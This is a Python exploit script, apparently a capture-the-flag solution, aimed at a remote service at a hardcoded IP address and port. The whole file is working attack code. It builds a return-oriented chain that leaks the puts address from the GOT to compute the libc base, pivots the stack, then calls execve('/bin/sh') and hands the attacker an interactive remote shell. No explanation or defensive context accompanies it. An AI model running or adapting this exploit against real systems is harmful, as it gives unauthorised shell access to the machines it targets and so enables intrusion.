#!/usr/bin/env python
import sc_pwn
from struct import *
import sys

#rhp  = ("192.168.75.129", 8080)
rhp  = ("202.112.26.106", 5149)

offset_libc_exit    = 0x000331e0    # nm -D libc.so.6 | grep hogeq
offset_libc_puts    = 0x00065650
offset_libc_execve  = 0x000b5be0
offset_libc_str_sh  = 0x00160a24

addr_plt_read       = 0x080484a0
addr_plt_puts       = 0x08048510

addr_pop1_ret       = 0x08048b01    # pop ebp ; ret
addr_pop2_ret       = 0x08048d8e    # pop edi ; pop ebp ; ret
addr_pop2c_ret      = 0x08048d89    # add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
addr_leave_ret      = 0x080485d8

addr_got_fail       = 0x0804b01c
addr_got_puts       = 0x0804b010

addr_data           = 0x0804b040

#==========

def attack(nc):
    nc.read_until('choice: ')
    nc.sendln('1')

    exploit  = pack('<I',addr_pop2c_ret)        # __stack_chk_fail@plt
    exploit += 'a'*4*2
    exploit += pack('<I',addr_plt_puts)         # puts(addr_got_puts)
    exploit += pack('<I',addr_pop1_ret)
    exploit += pack('<I',addr_got_puts)
    
    exploit += pack('<I',0x080486cb)            # read(0,addr_data,0x01ffffff)
    exploit += pack('<I',addr_pop2_ret)
    exploit += pack('<I',addr_data)
    exploit += pack('<I',0x01ffffff)
    
    exploit += pack('<I',addr_pop1_ret)         # stack pivot
    exploit += pack('<I',addr_data-4)
    exploit += pack('<I',addr_leave_ret)
    
    padding = 0x114-len(exploit)
    exploit += 'h'*(padding/3) + 'a'*(padding%3)
    exploit += pack('<I',addr_got_fail)         # arg0
    

    sys.stdout.write("[+]sending exploit....\n")
    nc.sendln(exploit)
    nc.read_until('choice: ')
    nc.sendln('4')
    
    addr_libc_puts      = unpack('<I',nc.read_all()[0:4])[0]
    addr_base_libc      = addr_libc_puts - offset_libc_puts
    addr_libc_execve    = addr_base_libc + offset_libc_execve
    addr_libc_exit      = addr_base_libc + offset_libc_exit
    addr_libc_str_sh    = addr_base_libc + offset_libc_str_sh

    sys.stdout.write("[+]base_libc     = 0x%08x\n"%addr_base_libc)
    sys.stdout.write("[+]addr_execve   = 0x%08x\n"%addr_libc_execve)
    sys.stdout.write("[+]addr_exit     = 0x%08x\n"%addr_libc_exit)
    sys.stdout.write("[+]addr_str_sh   = 0x%08x\n"%addr_libc_str_sh)

    payload  = pack('<I',addr_libc_execve)      #execve('/bin/sh',['/bin/sh',0],0)
    payload += pack('<I',addr_libc_exit)
    payload += pack('<I',addr_libc_str_sh)
    payload += pack('<I',addr_data+0xc)
    payload += pack('<I',0)

    sys.stdout.write("[+]sending payload....\n\n")
    nc.sendln(payload)

#==========

if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)

#==========
